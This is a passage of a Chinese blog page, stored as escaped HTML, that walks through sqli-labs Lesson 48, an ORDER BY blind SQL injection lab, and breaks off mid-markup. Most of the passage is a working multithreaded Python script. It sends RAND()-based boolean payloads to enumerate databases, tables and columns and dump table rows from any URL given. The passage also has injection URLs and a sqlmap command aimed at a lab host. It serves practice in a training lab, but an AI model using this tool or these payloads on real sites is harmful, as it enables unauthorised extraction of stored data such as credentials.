range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        newpayload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        newpayload = payload + <span class=\"string\">\"%26\"</span> + <span class=\"string\">\"%d=%d)\"</span> % (two[i], two[i])</span><br><span class=\"line\">        keys.append(newpayload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread, args=(</span><br><span class=\"line\">            getpayload(url, keys[i]), i, s,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> m:</span><br><span class=\"line\">        s = s | i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbname</span><span class=\"params\">(url, basehtml)</span>:</span></span><br><span class=\"line\">    num = getdbnum(url, basehtml)</span><br><span class=\"line\">    lenth = get_all_db_len(url, basehtml, num)</span><br><span class=\"line\">    dbs = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = <span class=\"string\">\"RAND(ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">                i, j)</span><br><span class=\"line\">            dbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">        print(dbname)</span><br><span class=\"line\">        dbs.append(dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'available databases [%s]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> db <span class=\"keyword\">in</span> dbs:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, db)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_num</span><span class=\"params\">(url, basehtml, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\"</span> % dbname</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">    <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据表数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_table_len</span><span class=\"params\">(url, basehtml, num, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\"</span> % dbname</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, basehtml, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_name</span><span class=\"params\">(url, basehtml, dbname)</span>:</span></span><br><span class=\"line\">    num = get_table_num(url, basehtml, dbname)</span><br><span class=\"line\">    lenth = get_all_table_len(url, basehtml, num, dbname)</span><br><span class=\"line\">    tables = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        tbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = <span class=\"string\">\"RAND(ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\"</span> % dbname</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            tbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, tbname)</span><br><span class=\"line\">        print(tbname)</span><br><span class=\"line\">        tables.append(tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d tables]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> table <span class=\"keyword\">in</span> tables:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, table)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_num</span><span class=\"params\">(url, basehtml, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\"</span> % (</span><br><span class=\"line\">        tbname, dbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]列数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_columns_len</span><span class=\"params\">(url, basehtml, num, tbname, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\"</span> % (</span><br><span class=\"line\">            tbname, dbname)</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"co\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, basehtml, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'co\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_name</span><span class=\"params\">(url, basehtml, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = get_column_num(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    lenth = get_all_columns_len(url, basehtml, num, tbname, dbname)</span><br><span class=\"line\">    columns = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        coname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = <span class=\"string\">\"RAND(ascii(substr((select column_name from information_schema.columns where table_name='%s' AND table_schema='%s' limit\"</span> % (</span><br><span class=\"line\">                tbname, dbname)</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            coname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, coname)</span><br><span class=\"line\">        print(coname)</span><br><span class=\"line\">        columns.append(coname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Table: %s'</span> % tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d columns]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, column)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> columns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_num</span><span class=\"params\">(url, basehtml, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\"</span> % (dbname, tbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d)\"</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]字段数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_len</span><span class=\"params\">(url, basehtml, coname, tbname, dbname, i)</span>:</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\"</span> % (</span><br><span class=\"line\">        coname, dbname, tbname, i)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d)\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前字段`%s`长度: %d'</span> % (coname, lenth))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段值</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(url, basehtml, coname, tbname, dbname, count)</span>:</span></span><br><span class=\"line\">    lenth = get_data_len(url, basehtml, coname, tbname, dbname, count)</span><br><span class=\"line\">    data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ascii(substr((select %s from %s.%s limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">            coname, dbname, tbname, count, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        data += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(url, basehtml, tbname, dbname, coname=None)</span>:</span></span><br><span class=\"line\">    num = get_data_num(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> coname <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        columns = get_column_name(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        columns = coname.split(<span class=\"string\">\",\"</span>)</span><br><span class=\"line\">    print(columns)</span><br><span class=\"line\">    datas = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">            data = get_data(url, basehtml, column, tbname, dbname, i)</span><br><span class=\"line\">            datas.append(data)</span><br><span class=\"line\">        datas.append(<span class=\"string\">'.'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    res = [s.split() <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> <span class=\"string\">' '</span>.join(datas).split(<span class=\"string\">'.'</span>) <span class=\"keyword\">if</span> s]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            print(<span class=\"string\">'%-15s'</span> % j, end=<span class=\"string\">''</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-u'</span>, <span class=\"string\">'--url'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'url'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-D'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'db'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-T'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'tbl'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table(s) to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-C'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'col'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table column(s) to enumerate, use like id,password'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dbs'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dbs'</span>, help=<span class=\"string\">'Enumerate ALL database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--tables'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'tables'</span>, help=<span class=\"string\">'Enumerate DBMS database tables'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--columns'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'columns'</span>, help=<span class=\"string\">'Enumerate DBMS database table columns'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dump'</span>, help=<span class=\"string\">'Dump DBMS database table entries'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump-all'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'all'</span>, help=<span class=\"string\">'Dump all DBMS databases tables entries'</span>)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    basehtml = getbasehtml(</span><br><span class=\"line\">        <span class=\"string\">'http://10.60.250.239/sql/Less-48/?sort=RAND(true)'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> options.url <span class=\"keyword\">and</span> options.dbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        getdbname(url, basehtml)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tables:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        get_table_name(url, basehtml, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.col <span class=\"keyword\">and</span> options.dump):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        coname = options.col</span><br><span class=\"line\">        dump(url, basehtml, tbname, dbname, coname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.all):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        dump(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.columns):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        get_column_name(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.250.239/sql/Less-48/?sort=1 --technique B --level 2 --risk 2 --dbms mysql --threads 25</code></p>\n<p><img src=\"/img/sql/Lesson-48/012.png\" alt=\"012\"></p>\n<p><img src=\"/img/sql/Lesson-48/013.png\" alt=\"013\"></p>\n<p>直接上结果</p>\n<p><img src=\"/img/sql/Lesson-48/014.png\" alt=\"014\"></p>\n<p><img src=\"/img/sql/Lesson-48/015.png\" alt=\"015\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-48-GET-基于错误-数字型盲注-OrderBy注入\"><a href=\"#sqli-labs-lession-48-GET-基于错误-数字型盲注-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs-lession 48 GET-基于错误-数字型盲注-OrderBy注入\"></a>sqli-labs-lession 48 GET-基于错误-数字型盲注-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-48/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这里没有了报错注入,使用盲注。</p>\n<p>经过判断为数字型</p>\n<p><code>http://10.60.250.239/sql/Less-48/?sort=1 desc</code></p>\n<p><img src=\"/img/sql/Lesson-48/002.png\" alt=\"002\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>可以利用rand(true/false)</p>\n<h3 id=\"获取数据库长度\"><a href=\"#获取数据库长度\" class=\"headerlink\" title=\"获取数据库长度\"></a>获取数据库长度</h3><p><code>http://10.60.250.239/sql/Less-48/?sort=rand((select length(database()))=8)</code></p>\n<p><img src=\"/img/sql/Lesson-48/003.png\" alt=\"003\"></p>\n<p>接下来拿了之前的盲注脚本改了下跑这一题了。</p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><img src=\"/img/sql/Lesson-48/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-48/005.png\" alt=\"005\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><img src=\"/img/sql/Lesson-48/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-48/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><img src=\"/img/sql/Lesson-48/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-48/009.png\" alt=\"009\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><img src=\"/img/sql/Lesson-48/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-48/011.png\" alt=\"011\"></p>\n<h3 id=\"临时脚本\"><a href=\"#临时脚本\" class=\"headerlink\" title=\"临时脚本\"></a>临时脚本</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span 